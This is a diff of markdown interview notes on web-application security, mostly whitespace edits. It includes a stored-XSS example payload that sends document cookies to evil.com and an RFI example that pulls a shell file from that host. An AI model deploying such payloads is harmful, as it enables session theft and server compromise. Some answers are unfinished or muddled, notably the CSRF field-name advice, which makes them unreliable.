@@ -1,28 +1,26 @@
 # Application / Web Application Security
 
-### Describe the last program or script that you wrote. What problem did it solve? 
+### Describe the last program or script that you wrote. What problem did it solve?
 
-### How would you implement a secure login field on a high traffic website where performance is a consideration? 
+### How would you implement a secure login field on a high traffic website where performance is a consideration?
 
-The answer you’re looking for here is that TLS is a must for the entire site at this point, and that there are very few situations where you shouldn’t insist on encryption. 
+The answer you’re looking for here is that TLS is a must for the entire site at this point, and that there are very few situations where you shouldn’t insist on encryption.
 
-### What are the various ways to handle account brute forcing? 
+### What are the various ways to handle account brute forcing?
 
-account lockouts, IP restrictions, fail2ban, commercial versions thereof, etc. 
+account lockouts, IP restrictions, fail2ban, commercial versions thereof, etc.
 
 ### What is XSS, stored XSS, reflected XSS and DOM-based XSS?
 
-**XSS:** injects malicious code into a vulnerable web application. XSS differs from other web attack vectors (e.g., SQL injections), in that it does not directly target the application itself. Instead, the users of the web application are the ones at risk. 
+**XSS:** injects malicious code into a vulnerable web application. XSS differs from other web attack vectors (e.g., SQL injections), in that it does not directly target the application itself. Instead, the users of the web application are the ones at risk.
 
-**Stored XSS:** also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. Stored Cross-site scripting vulnerabilities happens when the payload is saved, for example in a database and then is executed when a user opens the page. Stored cross-site scripting is very dangerous for a number of reasons: 
+**Stored XSS:** also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. Stored Cross-site scripting vulnerabilities happens when the payload is saved, for example in a database and then is executed when a user opens the page. Stored cross-site scripting is very dangerous for a number of reasons:
 
-**Reflected XSS:** Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user’s browser. The script is embedded into a link, and is only activated once that link is clicked on. A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored. This means that an attacker has to send a crafted link or post form to the victim to insert the payload, and the victim should click the link. Historically this kind of payload was sometimes caught by built-in browser XSS filters (e.g. Chrome's XSS Auditor, IE's XSS Filter), but these have since been removed/deprecated (Chrome removed the XSS Auditor in 2019), so they should not be relied on for protection. 
+**Reflected XSS:** Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user’s browser. The script is embedded into a link, and is only activated once that link is clicked on. A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored. This means that an attacker has to send a crafted link or post form to the victim to insert the payload, and the victim should click the link. Historically this kind of payload was sometimes caught by built-in browser XSS filters (e.g. Chrome's XSS Auditor, IE's XSS Filter), but these have since been removed/deprecated (Chrome removed the XSS Auditor in 2019), so they should not be relied on for protection.
 
-**DOM-based XSS:** an advanced type of XSS attack which is made possible when the web application’s client side scripts write user provided data to the Document Object Model (DOM). The data is subsequently read from the DOM by the web application and outputted to the browser. If the data is incorrectly handled, an attacker can inject a payload, which will be stored as part of the DOM and executed when the data is read back from the DOM. 
+**DOM-based XSS:** an advanced type of XSS attack which is made possible when the web application’s client side scripts write user provided data to the Document Object Model (DOM). The data is subsequently read from the DOM by the web application and outputted to the browser. If the data is incorrectly handled, an attacker can inject a payload, which will be stored as part of the DOM and executed when the data is read back from the DOM.
 
-
-
-`<img src=””>` will often load content from other websites, making a cross-origin HTTP request. 
+`<img src=””>` will often load content from other websites, making a cross-origin HTTP request.
 
 ### How would you hunt for XSS?
 
@@ -32,13 +30,13 @@ Map every place user input can enter and later be rendered (URL params, form fie
 
 Example: a comment field stores `<script>fetch('https://evil.com/?c='+document.cookie)</script>`, which then runs in the browser of everyone who views the comment (stored XSS). With XSS you can steal session cookies/tokens, perform actions as the victim, log keystrokes, rewrite the page for phishing, hook the browser with a framework like BeEF, or chain to a browser exploit. `HttpOnly` cookies blunt cookie theft but not the ability to act as the user.
 
-### Prevention on XSS 
+### Prevention on XSS
 
-Input Validation and Output Sanitization, with focus on the latter. 
+Input Validation and Output Sanitization, with focus on the latter.
 
-XSS can be prevented by the use of the proper available sanitizers. Web developers have to have an eye on the gateways through which they receive information and these are the gateways which must be made as a barrier for malicious files. 
+XSS can be prevented by the use of the proper available sanitizers. Web developers have to have an eye on the gateways through which they receive information and these are the gateways which must be made as a barrier for malicious files.
 
-There are software or applications available for doing this, like the XSS Me for Firefox and DOM snitch for Google Chrome. Also, the default web application firewall formula, popularly 
+There are software or applications available for doing this, like the XSS Me for Firefox and DOM snitch for Google Chrome. Also, the default web application firewall formula, popularly
 
 In addition, a strong CSP provides an additional layer of protection against XSS.
 
@@ -52,15 +50,15 @@ An HTTP response header (`Content-Security-Policy`) that tells the browser which
 
 Cross-Site Request Forgery tricks an authenticated user's browser into sending an unwanted state-changing request to a site where they are already logged in, abusing the browser's automatic inclusion of cookies. Example: a hidden auto-submitting form on a malicious page fires a fund transfer to the victim's bank using their live session; the server cannot tell it from a genuine request. Defenses: anti-CSRF tokens, `SameSite` cookies, verifying Origin/Referer, and re-authentication for sensitive actions.
 
-#### How does one defend against CSRF? 
+#### How does one defend against CSRF?
 
-Nonce required by the server for each page or each request is an accepted, albeit not foolproof, method. 
+Nonce required by the server for each page or each request is an accepted, albeit not foolproof, method.
 
-When CSRF attacks, you can opt for two available methods. 
+When CSRF attacks, you can opt for two available methods.
 
-Firstly, with every request try to include a random token. In this way a unique string of tokens will be generated which is a good safeguard. 
+Firstly, with every request try to include a random token. In this way a unique string of tokens will be generated which is a good safeguard.
 
-Secondly, for each field of form, try using different names. This will somewhat help you in becoming anonymous due to the entry of so many different names and thus will behave as a safeguard from CSRF attacks. 
+Secondly, for each field of form, try using different names. This will somewhat help you in becoming anonymous due to the entry of so many different names and thus will behave as a safeguard from CSRF attacks.
 
 In addition, consider Same-Site Cookie for preventing CSRF attacks.
 
@@ -78,13 +76,13 @@ SQL injection happens when untrusted input is concatenated into a SQL query, let
 
 ### HTTP Related
 
-#### What’s the difference between HTTP and HTML? 
+#### What’s the difference between HTTP and HTML?
 
-One is the networking/application protocol and the other is the markup language 
+One is the networking/application protocol and the other is the markup language
 
-#### How does HTTP handle state? 
+#### How does HTTP handle state?
 
-It doesn’t. Not natively. Good answers are things like “cookies”, but the best answer is that cookies are a hack to make up for the fact that HTTP doesn’t do it itself. 
+It doesn’t. Not natively. Good answers are things like “cookies”, but the best answer is that cookies are a hack to make up for the fact that HTTP doesn’t do it itself.
 
 #### HTTP Public Key Pinning
 
@@ -92,35 +90,35 @@ It doesn’t. Not natively. Good answers are things like “cookies”, but the 
 
 Deprecated by Google Chrome
 
-#### Cookies 
+#### Cookies
 
 httponly - cannot be accessed by javascript.
 
-#### SQLi 
+#### SQLi
 
 (Wo)man in the browser (flash / java applets) (malware).
 
 Validation / sanitisation of webforms.
 
-#### POST 
+#### POST
 
-Form data. 
+Form data.
 
-#### GET 
+#### GET
 
-Queries. 
+Queries.
 
 Visible from URL.
 
-### What is Exfiltration? Data Exfiltration 
+### What is Exfiltration? Data Exfiltration
 
-Infiltration is the method by which you enter or smuggle elements into a location. Exfiltration is just the opposite: getting sensitive information or objects out of a location without being discovered. In an environment with high security, this can be extremely difficult but not impossible. Again we turn to our friends in the fake delivery uniforms wandering around the building, and see that yes there are ways to get in and out without a lot of issues. 
+Infiltration is the method by which you enter or smuggle elements into a location. Exfiltration is just the opposite: getting sensitive information or objects out of a location without being discovered. In an environment with high security, this can be extremely difficult but not impossible. Again we turn to our friends in the fake delivery uniforms wandering around the building, and see that yes there are ways to get in and out without a lot of issues.
 
-Data exfiltration or Data extrusion is the unauthorized transfer of data from a computer. The transfer of data can be manual by someone with physical access to the computer or automated, carried out through malware over a network. Because data routinely moves in and out of networked enterprises, data exfiltration can closely resemble normal network traffic, making detection of exfiltration attempts challenging for IT security groups. 
+Data exfiltration or Data extrusion is the unauthorized transfer of data from a computer. The transfer of data can be manual by someone with physical access to the computer or automated, carried out through malware over a network. Because data routinely moves in and out of networked enterprises, data exfiltration can closely resemble normal network traffic, making detection of exfiltration attempts challenging for IT security groups.
 
 ### What is SOP (Same-origin policy)?
 
-A browser security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin. It does not stop cross-origin requests from being sent (that's why CSRF exists); it stops a script from reading the response or accessing the DOM/cookies of a different origin. An origin is the combination of scheme, host, and port. 
+A browser security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin. It does not stop cross-origin requests from being sent (that's why CSRF exists); it stops a script from reading the response or accessing the DOM/cookies of a different origin. An origin is the combination of scheme, host, and port.
 
 ### What is CORS (Cross-origin resource sharing)?
 
@@ -132,17 +130,17 @@ Subresource Integrity lets a page pin the expected content of an external script
 
 ### Buffer Overflow
 
-#### How does a buffer overflow work? 
+#### How does a buffer overflow work?
 
 A program writes more data into a fixed-size buffer than it can hold, overwriting adjacent memory. On the stack, overflowing a local buffer can overwrite the saved return address; when the function returns, execution jumps to an attacker-chosen location — injected shellcode, or (with a non-executable stack) a ROP chain built from existing code. The root cause is missing bounds checks, often via unsafe functions like `strcpy`, `gets`, or `sprintf`.
 
-#### How can one defend against buffer overflows? 
+#### How can one defend against buffer overflows?
 
 - Safe coding: bounds-check all copies, use length-limited functions (`strncpy`, `snprintf`), and prefer memory-safe languages (Rust, Go, Java).
-- Compiler/OS mitigations: stack canaries, DEP/NX (non-executable stack), ASLR, `FORTIFY_SOURCE`, and control-flow integrity.
-- Process: code review, static analysis, and fuzzing to find overflows before release.
+- Compiler/OS mitigations: stack canaries, DEP/NX (non-executable stack), ASLR, `FORTIFY_SOURCE`, and control-flow integrity
+- Process: code review, static analysis, and fuzzing to find overflows before release
 
-### Directory traversal 
+### Directory traversal
 
 Find directories on the server you’re not meant to be able to see.
 
@@ -150,9 +148,9 @@ There are tools that do this.
 
 How to prevent?
 
-### APIs 
+### APIs
 
-Think about what information they return. 
+Think about what information they return.
 
 And what can be sent.
 
@@ -176,7 +174,7 @@ A flaw where user input is used to include a file from the local server (e.g. `?
 
 Like LFI, but the application includes a file from a remote URL supplied by the attacker (e.g. `?page=http://evil.com/shell.txt`), directly executing attacker code on the server. Rare today because most runtimes disable remote includes by default (e.g. PHP `allow_url_include=Off`).
 
-### Web vuln scanners. 
+### Web vuln scanners.
 
 Automated tools that crawl an app and probe for common flaws (XSS, SQLi, misconfigurations, outdated components) — e.g. Burp Suite, OWASP ZAP, Nikto, Acunetix. Good for breadth and low-hanging fruit, but they miss logic flaws and produce false positives, so manual testing is still needed.
 
